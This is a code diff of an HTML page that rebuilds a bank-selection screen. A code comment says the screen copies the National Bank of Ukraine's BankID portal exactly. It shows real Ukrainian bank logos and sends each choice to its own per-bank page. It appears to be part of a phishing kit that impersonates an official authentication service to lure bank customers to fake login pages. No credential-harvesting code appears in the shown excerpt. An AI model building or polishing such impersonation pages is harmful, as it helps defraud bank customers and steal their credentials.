@@ -638,52 +638,107 @@
     </style>
 </head>
 <body>
-    <!-- Новый компактный выбор банка -->
-<div id="bank-selection-screen" class="select-container">
-  <div id="bankSelect" class="select-box">Оберіть банк...</div>
+    <!-- Новый экран выбора банка (1в1 как в BankID НБУ) -->
+<div id="bank-selection-screen" style="max-width:440px;margin:80px auto;font-family:'Inter',sans-serif;">
+  <h1 style="font-size:40px;font-weight:700;text-align:left;margin-bottom:30px;">Bank ID НБУ</h1>
 
-  <!-- Выпадающий список -->
-  <div id="dropdown" class="dropdown">
-    <div class="bank-item" data-bank="oschadbank">
-      <img src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Ощадбанк">
-      <span>Ощадбанк</span>
+  <div style="position:relative;">
+    <div id="bankSelect" 
+         style="font-size:18px;color:#333;padding:10px 0;border:none;border-bottom:2px solid #000;cursor:pointer;">
+      Оберіть банк, в якому ви маєте рахунок...
     </div>
 
-    <div class="bank-item" data-bank="raiffeisen">
-      <img src="https://play-lh.googleusercontent.com/c19N2AtbGM_cRT3ShxzKy1BB7mkLMVaae1HwwUAO0os1aZDKURnTyDXlOncMq7Cy_w" alt="Райффайзен">
-      <span>Райффайзен</span>
-    </div>
+    <div id="dropdown" 
+         style="display:none;position:absolute;top:100%;left:0;width:100%;background:#fff;border:1px solid #ccc;
+                box-shadow:0 4px 10px rgba(0,0,0,0.1);border-radius:4px;overflow:hidden;margin-top:2px;z-index:100;">
+      
+      <div style="background:#d9ebff;padding:12px 14px;color:#222;font-size:16px;">
+        Оберіть банк, в якому ви маєте рахунок...
+      </div>
 
-    <div class="bank-item" data-bank="alliance">
-      <img src="https://minfin.com.ua/img/company/114/logo/1725005151.png" alt="Альянс">
-      <span>Альянс</span>
-    </div>
+      <div class="bank-item" data-bank="privat24"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Privat24_Logo.png" 
+             alt="ПриватБанк" style="width:42px;height:auto;">
+        <span style="font-size:17px;">ПриватБанк</span>
+      </div>
 
-    <div class="bank-item" data-bank="vostok">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDLBej5jqnOr6kQxbNsHr5dzajqPvxQAXpVqgFLy-dTHlreiecuL1diuf6&s=10" alt="Восток">
-      <span>Восток</span>
-    </div>
+      <div class="bank-item" data-bank="oschadbank"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" 
+             alt="Ощадбанк" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Ощадбанк</span>
+      </div>
 
-    <div class="bank-item" data-bank="izibank">
-      <img src="https://play-lh.googleusercontent.com/eZmHofkCe6TwqfrH0CJbKBm82MlJtnyWizOq7-XvrKnWksB7z0HaE6PD-T8WCnQO7Q" alt="Izibank">
-      <span>Izibank</span>
-    </div>
+      <div class="bank-item" data-bank="alliance"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://minfin.com.ua/img/company/114/logo/1725005151.png" 
+             alt="Альянс" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Альянс</span>
+      </div>
 
-    <div class="bank-item" data-bank="ukrsib">
-      <img src="https://bank.gov.ua/files/Logobank/351005.png?v=14" alt="Укрсиб">
-      <span>Укрсиб</span>
-    </div>
+      <div class="bank-item" data-bank="vostok"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDLBej5jqnOr6kQxbNsHr5dzajqPvxQAXpVqgFLy-dTHlreiecuL1diuf6&s=10" 
+             alt="Восток" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Восток</span>
+      </div>
 
-    <div class="bank-item" data-bank="pumb">
-      <img src="https://forbes.ua/static/storage/thumbs/340x340/e/4a/4ba699e7-3e5e62261f39d70d2759f35af90bd4ae.png?v=1114_1" alt="ПУМБ">
-      <span>ПУМБ</span>
-    </div>
+      <div class="bank-item" data-bank="izibank"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://play-lh.googleusercontent.com/eZmHofkCe6TwqfrH0CJbKBm82MlJtnyWizOq7-XvrKnWksB7z0HaE6PD-T8WCnQO7Q" 
+             alt="Izibank" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Izibank</span>
+      </div>
 
-    <div class="bank-item" data-bank="privat24">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Privat24_Logo.png" alt="Приват24">
-      <span>Приват24</span>
+      <div class="bank-item" data-bank="ukrsib"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://bank.gov.ua/files/Logobank/351005.png?v=14" 
+             alt="Укрсиб" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Укрсиб</span>
+      </div>
+
+      <div class="bank-item" data-bank="pumb"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;border-bottom:1px solid #eee;">
+        <img src="https://forbes.ua/static/storage/thumbs/340x340/e/4a/4ba699e7-3e5e62261f39d70d2759f35af90bd4ae.png?v=1114_1" 
+             alt="ПУМБ" style="width:42px;height:auto;">
+        <span style="font-size:17px;">ПУМБ</span>
+      </div>
+
+      <div class="bank-item" data-bank="raiffeisen"
+           style="display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;">
+        <img src="https://play-lh.googleusercontent.com/c19N2AtbGM_cRT3ShxzKy1BB7mkLMVaae1HwwUAO0os1aZDKURnTyDXlOncMq7Cy_w" 
+             alt="Райффайзен" style="width:42px;height:auto;">
+        <span style="font-size:17px;">Райффайзен</span>
+      </div>
     </div>
   </div>
+
+  <button style="margin-top:40px;background:#000;color:#fff;font-weight:700;font-size:18px;padding:14px 38px;
+                 border:none;border-radius:50px;cursor:pointer;">Продовжити</button>
+</div>
+
+<script>
+  const selectBox = document.getElementById('bankSelect');
+  const dropdown = document.getElementById('dropdown');
+
+  selectBox.addEventListener('click', (e) => {
+    e.stopPropagation();
+    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+  });
+
+  document.addEventListener('click', () => dropdown.style.display = 'none');
+
+  dropdown.querySelectorAll('.bank-item').forEach(item => {
+    item.addEventListener('click', e => {
+      e.stopPropagation();
+      const bank = item.dataset.bank;
+      dropdown.style.display = 'none';
+      // переход на уникальную страницу
+      window.location.href = bank + '.html';
+    });
+  });
+</script>
 </div>
 
 <style>
